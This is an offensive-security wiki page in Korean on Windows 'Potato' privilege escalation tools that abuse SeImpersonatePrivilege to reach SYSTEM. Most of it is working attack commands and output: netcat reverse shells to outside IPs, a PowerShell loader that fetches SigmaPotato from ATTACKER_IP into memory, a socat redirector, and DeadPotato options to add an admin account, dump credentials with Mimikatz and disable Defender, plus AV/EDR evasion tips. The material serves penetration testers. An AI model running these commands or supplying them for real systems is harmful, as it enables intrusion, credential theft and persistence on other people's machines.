# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato는** Windows Server 2019 및 Windows 10 빌드 1809 이후 버전에서 작동하지 않습니다. 그러나 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**는 동일한 권한을 이용해 `NT AUTHORITY\SYSTEM` 수준의 접근을 획득하는 데 사용할 수 있습니다. 이 [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)는 `PrintSpoofer` 도구에 대해 심층적으로 설명하며, JuicyPotato가 더 이상 작동하지 않는 Windows 10 및 Server 2019 호스트에서 impersonation privileges를 악용하는 방법을 다룹니다.

> [!TIP]
> 2024–2025년에 자주 유지되는 현대적인 대안은 SigmaPotato(GodPotato의 포크)로, 인메모리/.NET 리플렉션 사용과 확장된 OS 지원을 추가합니다. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 요구사항 및 일반적인 주의사항

다음의 모든 기법은 다음 권한 중 하나를 보유한 컨텍스트에서 impersonation-capable한 특권 서비스를 악용하는 데 의존합니다:

- SeImpersonatePrivilege (가장 흔함) 또는 SeAssignPrimaryTokenPrivilege
- 토큰에 이미 SeImpersonatePrivilege가 있는 경우 High integrity는 필요하지 않습니다 (IIS AppPool, MSSQL 등 많은 서비스 계정에서 일반적임)

권한을 빠르게 확인:
```cmd
whoami /priv | findstr /i impersonate
```
운영 노트:

- 쉘이 SeImpersonatePrivilege 권한이 없는 제한된 토큰(일부 컨텍스트에서 Local Service/Network Service에 흔함)으로 실행되는 경우, FullPowers를 사용해 계정의 기본 권한을 복원한 뒤 Potato를 실행하세요. 예: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer는 Print Spooler 서비스가 실행 중이며 로컬 RPC 엔드포인트(spoolss)를 통해 접근 가능해야 합니다. PrintNightmare 이후 Spooler가 비활성화된 강화된 환경에서는 RoguePotato/GodPotato/DCOMPotato/EfsPotato를 선호하세요.
- RoguePotato는 TCP/135에서 접근 가능한 OXID resolver가 필요합니다. egress가 차단된 경우 리디렉터/포트 포워더를 사용하세요(아래 예 참조). 이전 빌드는 -f 플래그가 필요했습니다.
- EfsPotato/SharpEfsPotato는 MS-EFSR을 악용합니다; 하나의 pipe가 차단되면 다른 pipe들(lsarpc, efsrpc, samr, lsass, netlogon)을 시도해보세요.
- RpcBindingSetAuthInfo 도중 발생하는 오류 0x6d3은 일반적으로 알 수 없거나 지원되지 않는 RPC 인증 서비스임을 나타냅니다; 다른 pipe/transport를 시도하거나 대상 서비스가 실행 중인지 확인하세요.
- DeadPotato와 같은 "Kitchen-sink" 포크는 디스크를 건드리는 추가 페이로드 모듈(Mimikatz/SharpHound/Defender off)을 번들로 포함합니다; 슬림한 오리지널에 비해 EDR 탐지가 더 높을 것으로 예상하세요.

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
참고:
- 현재 콘솔에서 대화형 프로세스를 생성하려면 -i를 사용하거나, 한 줄 명령을 실행하려면 -c를 사용할 수 있습니다.
- Spooler 서비스가 필요합니다. 비활성화되어 있으면 동작하지 않습니다.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
outbound 135가 차단된 경우, redirector에서 socat을 통해 OXID resolver를 pivot하세요:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato는 2022년 말에 공개된 최신 COM 오용 프리미티브로, Spooler/BITS 대신 **PrintNotify** 서비스를 대상으로 합니다. 이 바이너리는 PrintNotify COM 서버를 인스턴스화하고, 가짜 `IUnknown`를 삽입한 다음 `CreatePointerMoniker`를 통해 권한 있는 콜백을 트리거합니다. PrintNotify 서비스(**SYSTEM**으로 실행)가 되돌아오면 프로세스는 반환된 토큰을 복제하고 제공된 페이로드를 전체 권한으로 스폰합니다.

주요 운영상 주의사항:

* Print Workflow/PrintNotify 서비스가 설치되어 있는 한 Windows 10/11 및 Windows Server 2012–2022에서 작동합니다(기존 Spooler가 PrintNightmare 이후 비활성화되어 있어도 존재합니다).
* 호출 컨텍스트가 **SeImpersonatePrivilege** 권한을 보유해야 합니다(일반적으로 IIS APPPOOL, MSSQL 및 scheduled-task 서비스 계정).
* 직접 명령 또는 대화형 모드 중 하나를 허용하므로 원래 콘솔에 그대로 머물 수 있습니다. 예:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 순수하게 COM 기반이므로 named-pipe 리스너나 외부 리다이렉터가 필요 없으며, Defender가 RoguePotato의 RPC 바인딩을 차단하는 호스트에서 바로 대체하여 쓸 수 있습니다.

Ink Dragon 같은 운영자들은 SharePoint에서 ViewState RCE를 얻은 직후 PrintNotifyPotato를 실행해 `w3wp.exe` 워커에서 SYSTEM으로 피벗한 다음 ShadowPad를 설치합니다.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
팁: 한 pipe가 실패하거나 EDR이 차단하면, 다른 지원되는 pipes를 시도하세요:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
참고:
- SeImpersonatePrivilege가 있는 경우 Windows 8/8.1–11 및 Server 2012–2022에서 동작합니다.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato는 RPC_C_IMP_LEVEL_IMPERSONATE를 기본값으로 사용하는 서비스 DCOM 객체를 노리는 두 가지 변형을 제공합니다. 제공된 바이너리를 빌드하거나 사용한 뒤 명령을 실행하세요:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (업데이트된 GodPotato fork)

SigmaPotato는 in-memory execution via .NET reflection과 PowerShell reverse shell helper 같은 최신 편의 기능을 추가합니다.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- 내장 reverse shell 플래그 `--revshell`와 1024-char PowerShell 제한 제거로 긴 AMSI-bypassing payload를 한 번에 실행할 수 있음.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), 그리고 단순 휴리스틱을 교란하기 위한 `VirtualAllocExNuma()` 기반의 기본적인 AV 우회 트릭.
- PowerShell Core 환경을 위해 .NET 2.0 대상으로 컴파일된 별도의 `SigmaPotatoCore.exe`.

### DeadPotato (2024 GodPotato 리워크 — 모듈 포함)

DeadPotato는 GodPotato OXID/DCOM impersonation chain을 유지하면서 post-exploitation 헬퍼를 내장해 운영자가 추가 도구 없이 즉시 SYSTEM 권한을 획득하고 persistence/collection을 수행할 수 있게 한다.

공통 모듈 (모두 SeImpersonatePrivilege 필요):

- `-cmd "<cmd>"` — SYSTEM 권한으로 임의의 명령을 실행.
- `-rev <ip:port>` — 빠른 reverse shell.
- `-newadmin user:pass` — persistence를 위한 로컬 관리자 계정 생성.
- `-mimi sam|lsa|all` — Mimikatz를 디스크에 기록하여 실행하고 자격 증명을 덤프함(디스크 기록 발생, 소음 큼).
- `-sharphound` — SYSTEM으로 SharpHound 수집 실행.
- `-defender off` — Defender 실시간 보호를 끔(매우 눈에 띔).

예제 원라이너:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
추가 바이너리를 포함하고 있기 때문에 AV/EDR 경고가 더 많이 발생할 수 있습니다; stealth가 중요할 경우 더 슬림한 GodPotato/SigmaPotato를 사용하세요.

## 참고자료

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
